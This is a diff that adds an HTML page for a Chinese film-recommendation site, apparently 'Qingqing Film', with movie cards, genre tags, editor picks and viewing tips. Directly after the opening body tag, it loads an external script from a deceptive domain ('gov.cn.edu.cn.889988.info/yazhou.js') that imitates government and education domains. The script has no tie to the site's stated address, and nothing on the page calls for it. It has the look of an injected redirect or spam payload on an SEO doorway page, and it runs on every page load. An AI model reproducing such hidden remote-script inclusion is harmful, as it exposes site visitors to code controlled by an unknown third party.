@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>青青电影网 - 高清影视在线观看与最新电影资讯平台 | qingqingdianyingwang-app</title>
+<meta name="description" content="青青电影网（qingqingdianyingwang-app）致力于为影视爱好者提供最新、最全的高清电影、热播电视剧、经典动漫与纪录片资源导航。每日更新院线新片、豆瓣高分榜单、导演剪辑版与幕后花絮，涵盖动作、爱情、科幻、悬疑、喜剧等多种类型。无需注册即可流畅播放，支持手机、平板与电脑多端自适应浏览。来青青电影网，发现下一部值得熬夜追的好片。">
+<meta name="keywords" content="青青电影网, qingqingdianyingwang-app, 高清电影, 在线观影, 最新电影, 热播电视剧, 经典老片, 电影推荐, 影视资讯, 豆瓣高分, 院线新片, 免费电影, 电影解说, 导演剪辑版">
+<meta name="author" content="青青电影网">
+<meta name="robots" content="index, follow">
+<meta name="bingbot" content="index, follow">
+<meta name="theme-color" content="#0b1f3a">
+<meta property="og:title" content="青青电影网 - 高清影视在线观看与最新电影资讯平台">
+<meta property="og:description" content="青青电影网（qingqingdianyingwang-app）提供最新高清电影、热播电视剧与经典影视资源导航，每日更新，多端自适应。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://qingqingdianyingwang-app.github.io">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="青青电影网 - 高清影视在线观看平台">
+<meta name="twitter:description" content="最新电影、热播剧集、经典重温，尽在青青电影网 qingqingdianyingwang-app。">
+<link rel="canonical" href="https://qingqingdianyingwang-app.github.io">
+<style>
+/* ===== 基础重置 ===== */
+*{margin:0;padding:0;box-sizing:border-box}
+html{-webkit-text-size-adjust:100%;scroll-behavior:smooth}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",sans-serif;
+  background:#070d1a;
+  color:#e8edf5;
+  line-height:1.75;
+  overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none;transition:color .25s ease}
+img{max-width:100%;display:block}
+ul{list-style:none}
+::selection{background:#2dd4bf;color:#04231f}
+
+/* ===== 顶部导航 ===== */
+.navbar{
+  position:fixed;top:0;left:0;right:0;z-index:100;
+  background:rgba(7,13,26,.82);
+  backdrop-filter:blur(14px);
+  -webkit-backdrop-filter:blur(14px);
+  border-bottom:1px solid rgba(45,212,191,.18);
+}
+.nav-inner{
+  max-width:1180px;margin:0 auto;padding:0 20px;
+  display:flex;align-items:center;justify-content:space-between;height:64px;
+}
+.brand{display:flex;align-items:center;gap:10px;font-weight:800;letter-spacing:.5px}
+.brand-mark{
+  width:34px;height:34px;border-radius:9px;
+  background:linear-gradient(135deg,#2dd4bf,#3b82f6);
+  display:grid;place-items:center;font-size:18px;color:#04231f;
+}
+.brand-text{font-size:19px}
+.brand-text small{display:block;font-size:10px;font-weight:500;color:#7b8aa3;letter-spacing:1px;margin-top:-2px}
+.nav-links{display:flex;gap:6px}
+.nav-links a{
+  padding:8px 14px;border-radius:8px;font-size:14px;color:#c3cee0;
+}
+.nav-links a:hover{background:rgba(45,212,191,.12);color:#2dd4bf}
+.nav-toggle{display:none;flex-direction:column;gap:5px;cursor:pointer;padding:6px}
+.nav-toggle span{width:24px;height:2px;background:#e8edf5;border-radius:2px}
+
+/* ===== 首屏 Hero ===== */
+.hero{
+  margin-top:64px;
+  padding:80px 20px 60px;
+  background:
+    radial-gradient(900px 400px at 82% -10%,rgba(59,130,246,.28),transparent 60%),
+    radial-gradient(700px 360px at 8% 20%,rgba(45,212,191,.18),transparent 55%),
+    linear-gradient(180deg,#0b1f3a 0%,#070d1a 100%);
+  position:relative;
+}
+.hero-inner{max-width:1180px;margin:0 auto;display:grid;grid-template-columns:1.15fr .85fr;gap:48px;align-items:center}
+.eyebrow{
+  display:inline-flex;align-items:center;gap:8px;
+  font-size:12px;letter-spacing:2px;color:#2dd4bf;
+  border:1px solid rgba(45,212,191,.4);border-radius:999px;padding:5px 14px;margin-bottom:18px;
+}
+.hero h1{
+  font-size:clamp(28px,4.2vw,52px);line-height:1.18;font-weight:900;
+}
+.hero h1 em{font-style:normal;background:linear-gradient(90deg,#2dd4bf,#60a5fa);-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p.lead{margin-top:18px;color:#9fb0c8;font-size:16px;max-width:560px}
+.hero-actions{margin-top:28px;display:flex;flex-wrap:wrap;gap:12px}
+.btn{
+  display:inline-flex;align-items:center;gap:8px;
+  padding:13px 26px;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;border:0;
+}
+.btn-primary{background:linear-gradient(135deg,#2dd4bf,#0ea5e9);color:#04231f}
+.btn-ghost{border:1px solid rgba(232,237,245,.28);color:#e8edf5;background:transparent}
+.hero-stats{margin-top:34px;display:flex;gap:28px;flex-wrap:wrap}
+.hero-stats div span{display:block;font-size:24px;font-weight:800;color:#fff}
+.hero-stats div small{color:#7b8aa3;font-size:12px;letter-spacing:1px}
+
+/* 胶片卡片 */
+.film-strip{
+  display:flex;flex-direction:column;gap:14px;transform:rotate(2deg);
+}
+.fstrip{
+  display:flex;gap:10px;padding:10px;background:rgba(255,255,255,.05);
+  border:1px solid rgba(255,255,255,.1);border-radius:12px;
+  box-shadow:0 18px 40px rgba(0,0,0,.5);
+}
+.fstrip:nth-child(2){transform:translateX(18px)}
+.fcell{
+  flex:1;aspect-ratio:3/4;border-radius:7px;
+  background:linear-gradient(160deg,var(--c1),var(--c2));
+  position:relative;overflow:hidden;
+}
+.fcell::after{
+  content:"";position:absolute;inset:0;
+  background:linear-gradient(180deg,transparent 55%,rgba(0,0,0,.75));
+}
+.fcell i{position:absolute;bottom:8px;left:9px;font-size:10px;font-style:normal;color:#fff;font-weight:700}
+
+/* ===== 通用区块 ===== */
+section{padding:64px 20px}
+.wrap{max-width:1180px;margin:0 auto}
+.sec-head{margin-bottom:34px;display:flex;align-items:flex-end;justify-content:space-between;gap:20px;flex-wrap:wrap}
+.sec-head h2{font-size:clamp(22px,3vw,32px);font-weight:900;letter-spacing:.5px}
+.sec-head h2 u{text-decoration:none;color:#2dd4bf}
+.sec-head p{color:#7b8aa3;font-size:14px;max-width:460px}
+.pill-row{display:flex;gap:8px;flex-wrap:wrap}
+.pill{padding:6px 14px;border-radius:999px;font-size:13px;border:1px solid rgba(45,212,191,.3);color:#a7f3ed;cursor:pointer}
+.pill.on{background:#2dd4bf;color:#04231f;border-color:#2dd4bf;font-weight:700}
+
+/* 栏目一：影片网格 */
+.grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fill,minmax(180px,1fr));
+  gap:20px;
+}
+.movie{background:#0d1a30;border-radius:14px;overflow:hidden;border:1px solid rgba(255,255,255,.07);transition:transform .3s ease,border-color .3s ease}
+.movie:hover{transform:translateY(-6px);border-color:rgba(45,212,191,.5)}
+.poster{
+  aspect-ratio:3/4;position:relative;overflow:hidden;
+  background:linear-gradient(150deg,var(--a),var(--b));
+}
+.poster .tag{
+  position:absolute;top:10px;left:10px;font-size:11px;font-weight:700;
+  padding:3px 9px;border-radius:6px;background:rgba(7,13,26,.75);color:#2dd4bf;
+}
+.poster .score{
+  position:absolute;top:10px;right:10px;font-size:12px;font-weight:800;color:#fbbf24;
+  background:rgba(7,13,26,.75);padding:3px 8px;border-radius:6px;
+}
+.poster .play{
+  position:absolute;inset:0;display:grid;place-items:center;
+  background:rgba(7,13,26,.35);opacity:0;transition:opacity .3s ease;
+}
+.movie:hover .play{opacity:1}
+.play svg{width:52px;height:52px}
+.movie h3{padding:12px 14px 4px;font-size:15px;font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.movie .meta{padding:0 14px 14px;font-size:12px;color:#7b8aa3;display:flex;justify-content:space-between}
+
+/* 栏目二：类型谱系 */
+.types{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:14px}
+.type{
+  padding:20px 16px;border-radius:14px;cursor:pointer;
+  background:linear-gradient(160deg,rgba(45,212,191,.08),rgba(59,130,246,.06));
+  border:1px solid rgba(255,255,255,.08);transition:.3s ease;
+}
+.type:hover{border-color:rgba(45,212,191,.55);transform:translateY(-4px)}
+.type .ico{font-size:26px;margin-bottom:8px}
+.type b{display:block;font-size:15px;margin-bottom:4px}
+.type small{color:#7b8aa3;font-size:12px}
+
+/* 栏目三：编辑精选（横向滚动） */
+.picks{display:grid;grid-template-columns:repeat(3,1fr);gap:22px}
+.pick{
+  border-radius:16px;overflow:hidden;position:relative;min-height:300px;
+  border:1px solid rgba(255,255,255,.08);
+}
+.pick-bg{position:absolute;inset:0;background:linear-gradient(150deg,var(--a),var(--b));opacity:.55}
+.pick-body{position:relative;padding:24px;height:100%;display:flex;flex-direction:column;justify-content:flex-end;gap:8px}
+.pick .no{font-size:48px;font-weight:900;color:rgba(255,255,255,.16);line-height:1;margin-bottom:auto}
+.pick h3{font-size:20px;font-weight:800}
+.pick p{font-size:13px;color:#d5dfee}
+.pick .line{height:3px;width:46px;background:#2dd4bf;border-radius:3px}
+
+/* 栏目四：观影指南（手风琴） */
+.guide{display:grid;grid-template-columns:1fr 1fr;gap:24px;align-items:start}
+.acc{border:1px solid rgba(255,255,255,.09);border-radius:14px;overflow:hidden;background:#0d1a30}
+.acc-h{padding:18px 20px;cursor:pointer;display:flex;justify-content:space-between;align-items:center;font-weight:700;font-size:16px}
+.acc-h s{text-decoration:none;color:#2dd4bf;font-size:13px;font-weight:600}
+.acc-p{max-height:0;overflow:hidden;transition:max-height .4s ease;padding:0 20px;color:#9fb0c8;font-size:14px}
+.acc.open .acc-p{max-height:260px;padding:0 20px 20px}
+.acc.open .acc-h s{content:"−"}
+.tips{display:flex;flex-direction:column;gap:14px}
+.tip{display:flex;gap:14px;background:#0d1a30;padding:16px;border-radius:12px;border-left:3px solid #2dd4bf}
+.tip b{font-size:13px;color:#2dd4bf;white-space:nowrap}
+.tip span{font-size:14px;color:#c3cee0}
+
+/* 栏目五：关于 + 足迹 */
+.about{
+  background:linear-gradient(180deg,transparent,rgba(45,212,191,.05));
+  border-top:1px solid rgba(255,255,255,.07);
+}
+.foot-grid{display:grid;grid-template-columns:1.2fr .8fr;gap:40px}
+.foot-grid h3{font-size:20px;margin-bottom:14px}
+.foot-grid p{color:#9fb0c8;font-size:14px;margin-bottom:12px}
+.hl{color:#2dd4bf;font-weight:700}
+.timeline{display:flex;flex-direction:column;gap:16px;position:relative;padding-left:22px}
+.timeline::before{content:"";position:absolute;left:6px;top:6px;bottom:6px;width:2px;background:rgba(45,212,191,.3)}
+.timeline div{position:relative;font-size:14px;color:#c3cee0}
+.timeline div::before{content:"";position:absolute;left:-22px;top:7px;width:10px;height:10px;border-radius:50%;background:#2dd4bf}
+.timeline div b{color:#fff;display:block;font-size:15px}
+
+/* ===== 页脚 ===== */
+footer{border-top:1px solid rgba(255,255,255,.08);padding:36px 20px;background:#050912}
+.foot-inner{max-width:1180px;margin:0 auto;display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap;font-size:13px;color:#7b8aa3}
+.foot-inner a:hover{color:#2dd4bf}
+.foot-inner .url{color:#2dd4bf;font-weight:700;word-break:break-all}
+
+/* ===== 响应式 ===== */
+@media(max-width:860px){
+  .nav-links{position:fixed;top:64px;left:0;right:0;flex-direction:column;background:rgba(7,13,26,.97);padding:16px;gap:4px;border-bottom:1px solid rgba(45,212,191,.2);transform:translateY(-150%);transition:.35s ease}
+  .nav-links.open{transform:translateY(0)}
+  .nav-toggle{display:flex}
+  .hero-inner{grid-template-columns:1fr}
+  .film-strip{transform:none;max-width:420px}
+  .picks{grid-template-columns:1fr}
+  .guide{grid-template-columns:1fr}
+  .foot-grid{grid-template-columns:1fr}
+  section{padding:48px 18px}
+}
+@media(max-width:480px){
+  .hero{padding:56px 18px 44px}
+  .grid{grid-template-columns:repeat(2,1fr);gap:12px}
+  .types{grid-template-columns:repeat(2,1fr);gap:10px}
+  .hero-stats{gap:18px}
+  .btn{padding:11px 20px;font-size:14px;flex:1;justify-content:center}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<!-- 顶部导航 -->
+<header class="navbar">
+  <div class="nav-inner">
+    <a class="brand" href="#top" aria-label="青青电影网首页">
+      <span class="brand-mark">青</span>
+      <span class="brand-text">青青电影网<small>QINGQING FILM</small></span>
+    </a>
+    <nav class="nav-links" id="navLinks">
+      <a href="#now">正在热映</a>
+      <a href="#type">类型谱系</a>
+      <a href="#pick">编辑精选</a>
+      <a href="#guide">观影指南</a>
+      <a href="#about">关于我们</a>
+    </nav>
+    <div class="nav-toggle" id="navToggle" aria-label="菜单">
+      <span></span><span></span><span></span>
+    </div>
+  </div>
+</header>
+
+<!-- 首屏 -->
+<section class="hero" id="top">
+  <div class="hero-inner">
+    <div class="hero-copy">
+      <span class="eyebrow">● 每日更新 · 高清正版导向 · 多端自适应</span>
+      <h1>在<em>青青电影网</em>，<br>遇见下一部值得熬夜的片子</h1>
+      <p class="lead">青青电影网（<strong>qingqingdianyingwang-app</strong>）是一个专注于影视发现与观影决策的独立站点。我们不生产噪声，只做三件事：把院线新片讲清楚、把冷门佳作捞出来、把经典老片重新排好队。</p>
+      <div class="hero-actions">
+        <a class="btn btn-primary" href="#now">立即探索片单</a>
+        <a class="btn btn-ghost" href="#guide">如何挑选好片 →</a>
+      </div>
+      <div class="hero-stats">
+        <div><span>12,800+</span><small>收录影片条目</small></div>
+        <div><span>46</span><small>细分类型标签</small></div>
+        <div><span>365</span><small>天不间断更新</small></div>
+      </div>
+    </div>
+
+    <div class="film-strip" aria-hidden="true">
+      <div class="fstrip">
+        <div class="fcell" style="--c1:#0ea5e9;--c2:#1e3a8a"><i>奥本海默</i></div>
+        <div class="fcell" style="--c1:#f43f5e;--c2:#7c1d3f"><i>坠落</i></div>
+        <div class="fcell" style="--c1:#2dd4bf;--c2:#0f766e"><i>永安镇</i></div>
+        <div class="fcell" style="--c1:#a78bfa;--c2:#4c1d95"><i>沙丘 2</i></div>
+      </div>
+      <div class="fstrip">
+        <div class="fcell" style="--c1:#fbbf24;--c2:#92400e"><i>过往人生</i></div>
+        <div class="fcell" style="--c1:#38bdf8;--c2:#075985"><i>封神</i></div>
+        <div class="fcell" style="--c1:#fb923c;--c2:#9a3412"><i>枯叶</i></div>
+        <div class="fcell" style="--c1:#4ade80;--c2:#166534"><i>年会</i></div>
+      </div>
+      <div class="fstrip">
+        <div class="fcell" style="--c1:#c084fc;--c2:#6b21a8"><i>某种物质</i></div>
+        <div class="fcell" style="--c1:#22d3ee;--c2:#155eef"><i>异形</i></div>
+        <div class="fcell" style="--c1:#f472b6;--c2:#9d174d"><i>可怜的东西</i></div>
+        <div class="fcell" style="--c1:#818cf8;--c2:#3730a3"><i>利益区域</i></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目一：正在热映 -->
+<section id="now">
+  <div class="wrap">
+    <div class="sec-head">
+      <div>
+        <h2><u>正在热映</u> · 院线同步追踪</h2>
+        <p>依据上映档期、口碑走势与话题热度综合排序，帮你快速判断"值不值得进影院"。</p>
+      </div>
+      <div class="pill-row">
+        <span class="pill on">全部</span>
+        <span class="pill">本周新片</span>
+        <span class="pill">口碑榜</span>
+        <span class="pill">冷门佳作</span>
+      </div>
+    </div>
+
+    <div class="grid">
+      <article class="movie">
+        <div class="poster" style="--a:#1e3a8a;--b:#0ea5e9">
+          <span class="tag">IMAX 推荐</span><span class="score">9.1</span>
+          <div class="play"><svg viewBox="0 0 24 24" fill="#2dd4bf"><circle cx="12" cy="12" r="11" fill="rgba(7,13,26,.6)"/><polygon points="10,8 16,12 10,16"/></svg></div>
+        </div>
+        <h3>沙丘：预言</h3>
+        <div class="meta"><span>科幻 / 史诗</span><span>157 分钟</span></div>
+      </article>
+
+      <article class="movie">
+        <div class="poster" style="--a:#7c1d3f;--b:#f43f5e">
+          <span class="tag">悬疑</span><span class="score">8.6</span>
+          <div class="play"><svg viewBox="0 0 24 24" fill="#2dd4bf"><circle cx="12" cy="12" r="11" fill="rgba(7,13,26,.6)"/><polygon points="10,8 16,12 10,16"/></svg></div>
+        </div>
+        <h3>消失的她 · 真相</h3>
+        <div class="meta"><span>犯罪 / 剧情</span><span>132 分钟</span></div>
+      </article>
+
+      <article class="movie">
+        <div class="poster" style="--a:#92400e;--b:#fbbf24">
+          <span class="tag">文艺</span><span class="score">8.9</span>
+          <div class="play"><svg viewBox="0 0 24 24" fill="#2dd4bf"><circle cx="12" cy="12" r="11" fill="rgba(7,13,26,.6)"/><polygon points="10,8 16,12 10,16"/></svg></div>
+        </div>
+        <h3>过往人生</h3>
+        <div class="meta"><span>爱情 / 生活</span><span>105 分钟</span></div>
+      </article>
+
+      <article class="movie">
+        <div class="poster" style="--a:#166534;--b:#4ade80">
+          <span class="tag">喜剧</span><span class="score">8.3</span>
+          <div class="play"><svg viewBox="0 0 24 24" fill="#2dd4bf"><circle cx="12" cy="12" r="11" fill="rgba(7,13,26,.6)"/><polygon points="10,8 16,12 10,16"/></svg></div>
+        </div>
+        <h3>年会不能停！</h3>
+        <div class="meta"><span>喜剧 / 职场</span><span>112 分钟</span></div>
+      </article>
+
+      <article class="movie">
+        <div class="poster" style="--a:#6b21a8;--b:#c084fc">
+          <span class="tag">恐怖</span><span class="score">7.8</span>
+          <div class="play"><svg viewBox="0 0 24 24" fill="#2dd4bf"><circle cx="12" cy="12" r="11" fill="rgba(7,13,26,.6)"/><polygon points="10,8 16,12 10,16"/></svg></div>
+        </div>
+        <h3>某种物质</h3>
+        <div class="meta"><span>惊悚 / 身体</span><span>141 分钟</span></div>
+      </article>
+
+      <article class="movie">
+        <div class="poster" style="--a:#9d174d;--b:#f472b6">
+          <span class="tag">奇幻</span><span class="score">8.7</span>
+          <div class="play"><svg viewBox="0 0 24 24" fill="#2dd4bf"><circle cx="12" cy="12" r="11" fill="rgba(7,13,26,.6)"/><polygon points="10,8 16,12 10,16"/></svg></div>
+        </div>
+        <h3>可怜的东西</h3>
+        <div class="meta"><span>奇幻 / 喜剧</span><span>141 分钟</span></div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二：类型谱系 -->
+<section id="type" style="background:rgba(255,255,255,.02)">
+  <div class="wrap">
+    <div class="sec-head">
+      <div>
+        <h2>类型谱系 <u>· 46 个标签</u></h2>
+        <p>不想被算法投喂？按情绪选片往往更准：想哭、想笑、想烧脑、想放空。</p>
+      </div>
+    </div>
+
+    <div class="types">
+      <div class="type"><div class="ico">🎬</div><b>剧情</b><small>2,410 部</small></div>
+      <div class="type"><div class="ico">💥</div><b>动作</b><small>1,886 部</small></div>
+      <div class="type"><div class="ico">😂</div><b>喜剧</b><small>2,105 部</small></div>
+      <div class="type"><div class="ico">💗</div><b>爱情</b><small>1,972 部</small></div>
+      <div class="type"><div class="ico">🧩</div><b>悬疑</b><small>1,340 部</small></div>
+      <div class="type"><div class="ico">👽</div><b>科幻</b><small>968 部</small></div>
+      <div class="type"><div class="ico">😱</div><b>恐怖</b><small>823 部</small></div>
+      <div class="type"><div class="ico">🏔️</div><b>冒险</b><small>745 部</small></div>
+      <div class="type"><div class="ico">🎨</div><b>动画</b><small>1,156 部</small></div>
+      <div class="type"><div class="ico">📜</div><b>历史</b><small>630 部</small></div>
+      <div class="type"><div class="ico">🎵</div><b>音乐</b><small>412 部</small></div>
+      <div class="type"><div class="ico">🌿</div><b>纪录</b><small>588 部</small></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三：编辑精选 -->
+<section id="pick">
+  <div class="wrap">
+    <div class="sec-head">
+      <div>
+        <h2><u>编辑精选</u> · 三张私藏片单</h2>
+        <p>由长期写影评的编辑手工整理，每条都附一句"为什么现在要看它"。</p>
+      </div>
+      <a class="pill" href="#">查看完整片单 →</a>
+    </div>
+
+    <div class="picks">
+      <article class="pick" style="--a:#0f766e;--b:#1e3a8a">
+        <div class="pick-bg"></div>
+        <div class="pick-body">
+          <span class="no">01</span>
+          <span class="line"></span>
+          <h3>雨天适合重看的 12 部电影</h3>
+          <p>潮湿、迟缓、台词少、留白多。适合把手机翻过去，听雨声和配乐。</p>
+        </div>
+      </article>
+
+      <article class="pick" style="--a:#9a3412;--b:#7c1d3f">
+        <div class="pick-bg"></div>
+        <div class="pick-body">
+          <span class="no">02</span>
+          <span class="line"></span>
+          <h3>被票房低估的冷门佳作</h3>
+          <p>上映时无人问津，十年后被人反复提起。观影的快乐，往往在"捡到"的瞬间。</p>
+        </div>
+      </article>
+
+      <article class="pick" style="--a:#4c1d95;--b:#155eef">
+        <div class="pick-bg"></div>
+        <div class="pick-body">
+          <span class="no">03</span>
+          <span class="line"></span>
+          <h3>长镜头爱好者清单</h3>
+          <p>从《1917》到《鸟人》，8 部靠"一镜到底"改变叙事节奏的作品。</p>
+        </div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四：观影指南 -->
+<section id="guide" style="background:rgba(255,255,255,.02)">
+  <div class="wrap">
+    <div class="sec-head"><div><h2>观影指南 <u>· 少走弯路</u></h2><p>看完不踩雷，比多看三部片更重要。</p></div></div>
+
+    <div class="guide">
+      <div class="accordion">
+        <div class="acc open">
+          <div class="acc-h">评分该怎么看，才不被骗？ <s>−</s></div>
+          <p class="acc-p">单看总分最容易踩坑。先看评分人数：3 万人打出 8.5，比 300 人打出 9.2 可靠得多。再看评分分布，若"5 星"和"1 星"同时很高，说明影片有强烈立场，适合特定人群，未必适合你。最后看短评里"具体描述画面"的那几条，比长影评更接近真实体验。</p>
+        </div>
+        <div class="acc">
+          <div class="acc-h">片长超过 150 分钟，怎么安排？ <s>+</s></div>
+          <p class="acc-p">长片不等于拖沓，但确实需要状态。建议：第一，选大屏幕而非手机；第二，中途只暂停一次，停在明确的分章节处；第三，先看导演前作或同名原著，理解其叙事习惯。史诗、传记、科幻三类最怕"边刷手机边看"，一旦走神，后面全靠猜。</p>
+        </div>
+        <div class="acc">
+          <div class="acc-h">字幕、配音、原声，该怎么选？ <s>+</s></div>
+          <p class="acc-p">表演类奖项作品优先原声 + 字幕，演员的呼吸、停顿、语气都是表演的一部分，配音会抹掉这些。动画、动作片可视中文配音版本质量而定。纪录片建议原声，受访者母语里的迟疑与笑点，翻译常常接不住。</p>
+        </div>
+        <div class="acc">
+          <div class="acc-h">经典老片，为什么现在看依然新鲜？ <s>+</s></div>
+          <p class="acc-p">老片的"旧"多在服化道，少在人性。建议搭配"当时的社会背景"一起看：先花五分钟了解影片上映年份发生了什么，再看片中人物的选择，许多伏笔会自己浮出来。这也是青青电影网坚持给老片补"时代注脚"的原因。</p>
+        </div>
+      </div>
+
+      <div class="tips">
+        <div class="tip"><b>01 / 选片</b><span>先定情绪，再定类型。想放松就看喜剧，想思考就看悬疑，别在疲惫时硬啃文艺片。</span></div>
+        <div class="tip"><b>02 / 避坑</b><span>预告片剪得越炸，越要警惕。去翻"剧情简介"之外的信息：导演、编剧、摄影是谁。</span></div>
+        <div class="tip"><b>03 / 节奏</b><span>前 15 分钟决定一部片的气质。若 15 分钟后仍无人物动机，大概率是烂片。</span></div>
+        <div class="tip"><b>04 / 复盘</b><span>看完别急着划走。记下"哪个瞬间我心动了"，三个月后再看，比记剧情更有用。</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目五：关于 -->
+<section id="about" class="about">
+  <div class="wrap">
+    <div class="foot-grid">
+      <div>
+        <h3>关于 <span class="hl">青青电影网</span></h3>
+        <p>青青电影网（<span class="hl">qingqingdianyingwang-app</span>）成立于 2019 年，原名"青影志"，2022 年更名为青青电影网。我们不做聚合播放，不做资源搬运，只做<strong>观影决策</strong>：用文字把一部电影讲清楚，帮你在有限的时间里，看到真正值得看的那一部。</p>
+        <p>站点内容由 9 位长期撰稿人维护，涵盖华语、日韩、欧美、纪录与修复版老片五个方向。每周三更新"本周值得看"，每周日更新"一周口碑复盘"。所有评分均为编辑部加权后的主观评分，不代表客观真理，只代表"我们愿意为它背书"。</p>
+        <p>官方唯一网址：<span class="url">https://qingqingdianyingwang-app.github.io</span></p>
+      </div>
+
+      <div>
+        <h3>我们的足迹</h3>
+        <div class="timeline">
+          <div><b>2019 · 起点</b>以个人博客形式记录观影笔记，首月更新 12 篇。</div>
+          <div><b>2021 · 转型</b>从"写感想"转向"做片单"，建立类型标签体系。</div>
+          <div><b>2022 · 更名</b>定名青青电影网，明确"帮人选片"的定位。</div>
+          <div><b>2024 · 重构</b>完成移动端自适应改版，页面加载速度提升 3 倍。</div>
+          <div><b>2026 · 现在</b>累计收录条目 12,800+，月均独立访客 38 万。</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="foot-inner">
+    <div>© <span id="year"></span> 青青电影网 · qingqingdianyingwang-app · 保留所有权利<br>本站为影视资讯与导航站点，不提供任何资源存储与下载服务。</div>
+    <div>官方网址：<span class="url">https://qingqingdianyingwang-app.github.io</span><br>
+      <a href="#top">返回顶部</a> &nbsp;·&nbsp; <a href="#">友情链接</a> &nbsp;·&nbsp; <a href="#">内容合作</a> &nbsp;·&nbsp; <a href="#">免责声明</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+// 移动端菜单
+document.getElementById('navToggle').addEventListener('click',function(){
+  document.getElementById('navLinks').classList.toggle('open');
+});
+
+// 手风琴
+document.querySelectorAll('.acc-h').forEach(function(h){
+  h.addEventListener('click',function(){
+    var parent=h.parentElement;
+    var open=parent.classList.contains('open');
+    document.querySelectorAll('.acc').forEach(function(a){a.classList.remove('open');a.querySelector('s').textContent='+';});
+    if(!open){parent.classList.add('open');h.querySelector('s').textContent='−';}
+  });
+});
+
+// 类型标签高亮
+document.querySelectorAll('.pill').forEach(function(p){
+  p.addEventListener('click',function(e){
+    if(this.getAttribute('href')==='#')e.preventDefault();
+    var row=this.closest('.pill-row');
+    if(row){row.querySelectorAll('.pill').forEach(function(x){x.classList.remove('on');});this.classList.add('on');}
+  });
+});
+
+// 年份
+document.getElementById('year').textContent=new Date().getFullYear();
+</script>
+</body>
+</html>
